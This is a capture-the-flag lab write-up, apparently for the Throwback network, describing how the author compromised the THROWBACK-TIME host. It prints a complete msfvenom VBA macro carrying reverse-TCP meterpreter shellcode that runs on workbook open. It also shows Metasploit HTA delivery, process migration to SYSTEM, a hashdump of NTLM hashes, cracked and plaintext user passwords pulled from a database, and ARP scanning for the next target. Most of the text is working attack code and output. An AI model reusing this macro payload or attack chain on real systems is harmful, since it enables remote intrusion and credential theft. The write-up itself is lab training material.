# recon
```
Not shown: 992 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
443/tcp  open  https
445/tcp  open  microsoft-ds
3306/tcp open  mysql
3389/tcp open  ms-wbt-server
```
Remember the email that `murphyf` got?
```
Dear Frank Murphy,

Due to the recent firing of the Timekeep developer who had access to our
database, we have decided to issue a password reset. You can do so by
replacing your user account name and your new password in the following
URL:

http://timekeep.throwback.local/dev/passwordreset.php?user=murphyf&password=PASSWORD

Thank you,
IT Security.
```
so let visit the page and reset his password `/dev/passwordreset.php?user=murphyf&password=PASSWORD`. Boom! we also get a flag!!! now login with his credential. seem like we can upload a `.xlsm` file.... 


so the plan is sneak our payload inside `.xlsm` using `macros`
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=53 -f vba`
```#If Vba7 Then
	Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal Qgeex As Long, ByVal Rqmo As Long, ByVal Vulkt As LongPtr, Aiihe As Long, ByVal Seeimvn As Long, Oih As Long) As LongPtr
	Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal Jhfjnj As Long, ByVal Ixlo As Long, ByVal Ert As Long, ByVal Qhh As Long) As LongPtr
	Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal Lzihcehpx As LongPtr, ByRef Hqgwdjsa As Any, ByVal Joqmlt As Long) As LongPtr
#Else
	Private Declare Function CreateThread Lib "kernel32" (ByVal Qgeex As Long, ByVal Rqmo As Long, ByVal Vulkt As Long, Aiihe As Long, ByVal Seeimvn As Long, Oih As Long) As Long
	Private Declare Function VirtualAlloc Lib "kernel32" (ByVal Jhfjnj As Long, ByVal Ixlo As Long, ByVal Ert As Long, ByVal Qhh As Long) As Long
	Private Declare Function RtlMoveMemory Lib "kernel32" (ByVal Lzihcehpx As Long, ByRef Hqgwdjsa As Any, ByVal Joqmlt As Long) As Long
#EndIf

Sub Auto_Open()
	Dim Ewqk As Long, Jlklmy As Variant, Rwlnkaroh As Long
#If Vba7 Then
	Dim  Xvpqprj As LongPtr, Vnwf As LongPtr
#Else
	Dim  Xvpqprj As Long, Vnwf As Long
#EndIf
	Jlklmy = Array(232,130,0,0,0,96,137,229,49,192,100,139,80,48,139,82,12,139,82,20,139,114,40,15,183,74,38,49,255,172,60,97,124,2,44,32,193,207,13,1,199,226,242,82,87,139,82,16,139,74,60,139,76,17,120,227,72,1,209,81,139,89,32,1,211,139,73,24,227,58,73,139,52,139,1,214,49,255,172,193, _
207,13,1,199,56,224,117,246,3,125,248,59,125,36,117,228,88,139,88,36,1,211,102,139,12,75,139,88,28,1,211,139,4,139,1,208,137,68,36,36,91,91,97,89,90,81,255,224,95,95,90,139,18,235,141,93,104,51,50,0,0,104,119,115,50,95,84,104,76,119,38,7,137,232,255,208,184,144,1,0, _
0,41,196,84,80,104,41,128,107,0,255,213,106,10,104,10,50,9,18,104,2,0,1,188,137,230,80,80,80,80,64,80,64,80,104,234,15,223,224,255,213,151,106,16,86,87,104,153,165,116,97,255,213,133,192,116,10,255,78,8,117,236,232,103,0,0,0,106,0,106,4,86,87,104,2,217,200,95,255,213, _
131,248,0,126,54,139,54,106,64,104,0,16,0,0,86,106,0,104,88,164,83,229,255,213,147,83,106,0,86,83,87,104,2,217,200,95,255,213,131,248,0,125,40,88,104,0,64,0,0,106,0,80,104,11,47,15,48,255,213,87,104,117,110,77,97,255,213,94,94,255,12,36,15,133,112,255,255,255,233,155, _
255,255,255,1,195,41,198,117,193,195,187,240,181,162,86,106,0,83,255,213)

	Xvpqprj = VirtualAlloc(0, UBound(Jlklmy), &H1000, &H40)
	For Rwlnkaroh = LBound(Jlklmy) To UBound(Jlklmy)
		Ewqk = Jlklmy(Rwlnkaroh)
		Vnwf = RtlMoveMemory(Xvpqprj + Rwlnkaroh, Ewqk, 1)
	Next Rwlnkaroh
	Vnwf = CreateThread(0, 0, Xvpqprj, 0, 0, 0)
End Sub
Sub AutoOpen()
	Auto_Open
End Sub
Sub Workbook_Open()
	Auto_Open
End Sub
```
but it didnt works seem like AV is blocking it so we try with `hta_server` instead!
```
msf5 auxiliary(server/socks4a) > exploit/windows/misc/hta_server
[-] Unknown command: exploit/windows/misc/hta_server.
This is a module we can load. Do you want to use exploit/windows/misc/hta_server? [y/N]   y
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf5 exploit(windows/misc/hta_server) > set lport 444
lport => 444
msf5 exploit(windows/misc/hta_server) > exploit -j
[*] Exploit running as background job 3.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.50.9.18:444 
[*] Using URL: http://0.0.0.0:8080/TQgfMCHPP8.hta
[*] Local IP: http://172.16.230.142:8080/TQgfMCHPP8.hta
```

```
[*] 10.200.11.176    hta_server - Delivering Payload
[*] Sending stage (176195 bytes) to 10.200.11.176
[*] Meterpreter session 2 opened (10.50.9.18:444 -> 10.200.11.176:49900) at 2020-11-06 14:16:04 -0500

msf5 exploit(windows/misc/hta_server) > sessions 

Active sessions
===============

  Id  Name  Type                     Information                                    Connection
  --  ----  ----                     -----------                                    ----------
  1         meterpreter x86/windows  THROWBACK-WS01\BlaireJ @ THROWBACK-WS01        10.50.9.18:443 -> 10.200.11.222:62876 (10.200.11.222)
  2         meterpreter x86/windows  THROWBACK-TIME\Administrator @ THROWBACK-TIME  10.50.9.18:444 -> 10.200.11.176:49900 (10.200.11.176)

msf5 exploit(windows/misc/hta_server) > sessions 2
[*] Starting interaction with 2...

meterpreter > getuid 
Server username: THROWBACK-TIME\Administrator
```
Yea we are admin!!!, now let dump the hashes!!
```
meterpreter > hashdump 
[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
```
nope, seem like the process that we are in dont have privilage for this acction. let migrate to another process which is running as `NT AUTHORITY\SYSTEM`.
```
meterpreter > migrate 1968
[*] Migrating from 3924 to 1968...
[*] Migration completed successfully.
meterpreter > hashdump 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:43d73c6a52e8626eabc5eb77148dca0b:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
sshd:1008:aad3b435b51404eeaad3b435b51404ee:6eea75cd2cc4ddf2967d5ee05792f9fb:::
Timekeeper:1009:aad3b435b51404eeaad3b435b51404ee:901682b1433fdf0b04ef42b13e343486:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb7cb47ca1:::
```
check crackstation
- Timekeeper:keeperoftime
- Guest+DefaultAccount: NOPASSWD

We already know from `nmap` + `ps` + `netstats` that there is a sql server running on `TIME`. Our next goal is access the sql server, we will try with the password that we got from **Kerberoast attack** `SQLService:mysql337570`
```console
meterpreter > pwd
C:\
meterpreter > cd xampp/mysql/bin
meterpreter > shell 
Process 3756 created.
Channel 3 created.
Microsoft Windows [Version 10.0.17763.1282]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\xampp\mysql\bin>mysql.exe -u root -p mysql337570
mysql.exe -u root -p mysql337570


```
and it just hanging there.... I tried many times but it still didnt works. so let try to ssh to the server using `Timekeeper:keeperoftime`
```
timekeeper@THROWBACK-TIME C:\xampp\mysql\bin>mysql.exe -u root -p    
Enter password: *********** 
Welcome to the MariaDB monitor.  Commands end with ; or \g. 
Your MariaDB connection id is 12
Server version: 10.4.13-MariaDB mariadb.org binary distribution      

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others. 

Type 'help;' or '\h' for help. Type '\c' to clear the current input s
tatement.

MariaDB [(none)]> show databases; 
+--------------------+    
| Database           |    
+--------------------+    
| domain_users       |    
| information_schema |    
| mysql              |    
| performance_schema |    
| pets               |    
| phpmyadmin         |    
| test               |    
| timekeepusers      |    
+--------------------+    
8 rows in set (0.003 sec) 

MariaDB [(none)]> use timekeepusers; 
Database changed 
MariaDB [timekeepusers]> show tables 
    -> ; 
+-------------------------+ 
| Tables_in_timekeepusers |
+-------------------------+
| users                   |
+-------------------------+
1 row in set (0.000 sec)

MariaDB [timekeepusers]> select * from users; 
+---------------+-------------------------------------------------+ 
| USERNAME      | PASSWORD                                        |  
+---------------+-------------------------------------------------+  
| spopy         | ilylily                                         |  
| foxxr         | Fnfdsfdf49sA(2o1id                              |  
| winterss      | rei0g0erggdfs(2o1id                             |  
| daiban        | Bananas!                                        |  
| blairej       | BlaireJ2020                                     |  
| FLAG          | TBH{ac3f61048236fd398da9e2289622157e}           |  
| daviesj       | FEFJdfjep302dojsdfsFSFD                         |  
| horsemanb     | XZCFLDOSPfem,wefweop3202D                       |  
| peanutbutterm | fi9sfjidsJXSVNSKXKNXSIOPfpoiewspf               |  
| humphreyw     | fedw99fjpfdsjpjpfodspjofpjf99                   |  
| jeffersd      | fDSOKFSDFLMmxcvmxz;p[p[dgp[edfjf99              |  
| petersj       | owowhatsthisowoDarknessBestGirlowo123uwu");        



 |
| foxxr         | ILoveAnimemes :3                                |  
| daviesj       | efepjfjsdfjdsfpjopfdj4po                        |  
| gongoh        | etregrokdfskggdf'fd4po                          |  
| dosierk       | e2349efjsdsdfhgopfdj4po                         |  
| murphyf       | Summer2020                                      |  
| jstewart      | e423jjfjdsjfsdj32                               |  
+---------------+-------------------------------------------------+  
18 rows in set (0.001 sec)
```
another database that looks interesting is `domain_users`
```
MariaDB [domain_users]> select * from users; 
+----------------------+ 
| name                 |
+----------------------+
| ClemonsD             |
| DunlopM              |
| LoganF               |
| IbarraA              |
| YatesZ               |
| CopelandS            |
| MckeeE               |
| HeatonC              |
| FlowersK             |
| HardinA              |
| BurrowsA             |
| FinneganI            | 
| GalindoI             |
| LyonsC               |
| FullerS              |
| SteeleJ              |
| WangG                |
| LoweryR              |
| JeffersD             |
| GreigH               |
| SharpK               |
| KruegerM             |
| ChenI                |
| VillanuevaD          |
| BegumK               |
| TBH{ac3f61048236fd39 |
| 8da9e2289622157e}    |
+----------------------+
27 rows in set (0.002 sec)
```
so we have wordlist for both username + passwords that we might be able to use for brute forcing/password spraying in the future.

okey, it seem like that we are done with `TIME` our next tartget is `THROWBACK-DC01 10.200.11.117`. Before we move on from `TIME` let run `arp_scanner`
```
meterpreter > run arp_scanner -r 10.200.11.0/24
[*] ARP Scanning 10.200.11.0/24
[*] IP: 10.200.11.1 MAC 02:eb:1c:a4:33:73
[*] IP: 10.200.11.79 MAC 02:b9:b5:da:b7:43
[*] IP: 10.200.11.118 MAC 02:01:7d:c6:0c:a1
[*] IP: 10.200.11.117 MAC 02:2a:19:4e:a4:45
[*] IP: 10.200.11.138 MAC 02:4c:02:23:6c:65
[*] IP: 10.200.11.176 MAC 02:d3:42:f3:9e:1b
[*] IP: 10.200.11.222 MAC 02:7b:c6:d0:59:69
[*] IP: 10.200.11.232 MAC 02:e4:2b:d1:10:01
[*] IP: 10.200.11.243 MAC 02:bf:e2:f4:b7:c9
[*] IP: 10.200.11.255 MAC 02:d3:42:f3:9e:1b
```
hmmm. same results as WS01... wanna know why? check network topo and then you will understand!

